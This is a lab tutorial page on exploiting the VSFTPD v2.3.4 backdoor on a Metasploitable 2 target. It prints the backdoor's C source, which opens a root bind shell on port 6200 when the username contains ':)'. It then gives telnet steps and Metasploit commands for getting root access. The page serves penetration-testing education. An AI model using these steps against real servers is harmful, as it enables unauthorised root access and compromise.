======================================
Exploiting vulnerabilities in practice
======================================

.. index::
   single: Exploiting vulnerabilities in practice
   single: Exploitation; Exploiting vulnerabilities in practice

.. contents::
    :depth: 3
    :backlinks: top

####

------------------------
Exploiting VSFTPD v2.3.4
------------------------

VSFTPD v2.3.4 vulnerable source code
====================================

    .. note:: 
        
        **Liens Web**
        
        * `VSFTPD v2.3.4 (exploit from pastebin)`_
    
.. _`VSFTPD v2.3.4 (exploit from pastebin)`: https://pastebin.com/AetT9sS5

    .. note:: 
        
        When we scroll through the exploit code we find the following code (lines 37 to 41)
        validates the user input on the username:
        
        .. code:: shell
            :number-lines: 37
            :force:

             else if((p_str->p_buf[i]==0x3a)
             && (p_str->p_buf[i+1]==0x29))
             {
               vsf_sysutil_extra();
             }

    .. important:: 
        
        **Hexadecimal to ASCII**

            * 0x3a= :
            * 0x29= )

Line 37 and 38 checks for user input containing hexadecimal chars 0x3a followed by 0x29 which
together represent the smiley face ":)" characters. When the username contains both these characters
the ‘else if’ statement executes the vsf_sysutil_extra function.

    .. note:: 
        
        **vsf_sysutil_extra function**

        .. code::
            :number-lines: 75
            :force:

             int
             vsf_sysutil_extra(void)
             {
                 int fd, rfd;
                 struct sockaddr_in sa;
                 if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
                 exit(1); 
                 memset(&sa, 0, sizeof(sa));
                 sa.sin_family = AF_INET;
                 sa.sin_port = htons(6200);
                 sa.sin_addr.s_addr = INADDR_ANY;
                 if((bind(fd,(struct sockaddr *)&sa,
                 sizeof(struct sockaddr))) < 0) exit(1);
                 if((listen(fd, 100)) == -1) exit(1);
                 for(;;)
                 { 
                   rfd = accept(fd, 0, 0);
                   close(0); close(1); close(2);
                   dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
                   execl("/bin/sh","sh",(char *)0); 
                 } 
             }

A socket is a way of connecting two network nodes together so they can communicate with each other.
The first socket is listening for an incoming connection while the second socket reaches out and
connects to the listening socket. The server forms the listening socket and the client the
connecting socket. With this in mind let’s have a look at the exploit code from line 79 and onwards.

The ‘struct sockaddr_in’ in line 79 is a code structure in C programming that defines a variable in
the socket code. In this case ‘struct sockaddr_in sa’ defines the internet address as ‘sa’. The
structure is defined by the sin_family which is set to the constant AF_INET (IPv4 address type) in
line 83, sin_port is set to 6200 in line 84 and the client address set to ‘any’ in line 85. The code
after that uses the structure to setup a bind socket and a listener process on the socket to listen
for incoming connections. Note that this code is run in the target server context, so the server
sets up the bind socket and listener which is used by the remote attacker for setting up a
connection. Line 94 provides a shell to anyone connecting to the server on port 6200.

Exploiting VSFTPD v2.3.4 manually
=================================

Now we will demonstrate exploiting the backdoor vulnerability manually by connecting to the VSFTPD
service and using a Smiley face as the username to authenticate.

    .. note:: 
        
        Enter the following command on your attack box:
        
        .. code:: shell
            :number-lines:
            :force:

             telnet [Metasploitable IP] 21

             USER user:)
             PASS pass

        Then use the escape character ^] (ctrl+]) or wait a few seconds.

        .. image:: images/vsftpBackdoor.png
           :width: 500 px
           :align: center

        If we then fire up Nmap and scan for port 6200 we should see that the malicious code has
        been executed and port 6200 is open:

        .. image:: images/vsftpd_nmap.png
           :width: 500 px
           :align: center

        Let’s connect to port 6200 using telnet with the following command:

        .. code:: shell
           :number-lines:
           :force:

             telnet [target host IP] 6200

        If we enter the command id; we will see that the FTP service is running as root and we have
        a root shell on Metasploitable 2.

        .. image:: images/002-vsftpd-backdoor-002.jpg
           :width: 500 px
           :align: center

Exploiting VSFTPD v2.3.4 with Metasploit
========================================

    .. note:: 
        
        Open :ref:`Metasploit <ref_Metasploit>`
        
        .. code:: shell
            :number-lines:
            :force:

             sudo msfconsole

    .. note:: 
        
        Search for the modules and select the one you want to use.

        .. code:: shell
            :number-lines:
            :force:

             Search vsftpd

        .. image:: images/metasploitSearch_vsftp.png
           :width: 500 px
           :align: center

        .. code:: shell
            :number-lines:
            :force:

             use 1

        .. image:: images/metasploitUse_1.png
           :width: 500 px
           :align: center

        Shows the list of the payload availlabe and select one to use.

        .. code:: shell
            :number-lines:
            :force:

             show payloads
             # [...]
             set payloads 0

        .. image:: images/metasploitPayload.png
           :width: 500 px
           :align: center

        show the option list and satisfy the ones that are required

        .. code:: shell
            :number-lines:
            :force:

             show options

        .. image:: images/metasploitShowOptions.png
           :width: 500 px
           :align: center

        Run the exploit. If the exploit succed, you can enter the "id" command to know is the user
        you are using on the reverse shell.

        .. code:: shell
            :number-lines:
            :force:

             run

             # [...]
             
             id

        .. image:: images/metasploitRun.png
           :width: 500 px
           :align: center


####

--------
Weblinks
--------

.. target-notes::